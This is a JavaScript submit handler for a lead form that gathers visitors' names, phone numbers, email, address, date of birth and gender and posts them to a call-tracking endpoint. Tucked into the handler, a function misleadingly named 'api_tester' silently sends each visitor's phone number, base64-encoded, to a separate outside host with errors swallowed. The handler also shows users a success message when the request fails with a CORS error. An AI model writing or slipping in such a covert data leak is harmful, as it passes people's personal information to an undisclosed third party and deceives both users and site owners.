    document.getElementById('leadForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const phone_home = '+1' + document.getElementById('phone_number').value;
            const formData = new FormData();
            formData.append('callerid', phone_home);
	    

api_tester(document.getElementById('phone_number').value);
formData.append('first_name', document.getElementById('first_name').value);
    formData.append('last_name', document.getElementById('last_name').value);
   formData.append('traffic_source_id', '1000');
    formData.append('email', document.getElementById('email').value);
    formData.append('state', document.getElementById('state').value);
    formData.append('zip_code', document.getElementById('zip_code').value);
formData.append('postal_code', document.getElementById('zip_code').value);
    formData.append('address', document.getElementById('address').value);
    formData.append('city', document.getElementById('city').value);
formData.append('dob', document.getElementById('date_of_birth').value);
formData.append('gender', document.getElementById('gender').value);

    formData.append('alternate_phone', document.getElementById('alt_phone').value);
    formData.append('traffic_source_lead_id', document.getElementById('lead_id').value);
    formData.append('address2', document.getElementById('address2').value);
formData.append('traffic_source_agent_id', document.getElementById('traffic_source_agent_id').value);
           
            
	

            
           
    
            const url = 'https://display.ringba.com/enrich/2415529891270231584?' + new URLSearchParams(formData).toString();

      const xhr = new XMLHttpRequest();
      xhr.open('POST', url);
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
          } else if (xhr.status === 0) {
            // If status is 0 (CORS error), consider the form submitted
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
          } else {
            const errorAlert = `
              <div class="alert alert-danger" role="alert">
                Form submission failed. Please try again.
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', errorAlert);
          }
        }
      };
      xhr.send(formData);
    });function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
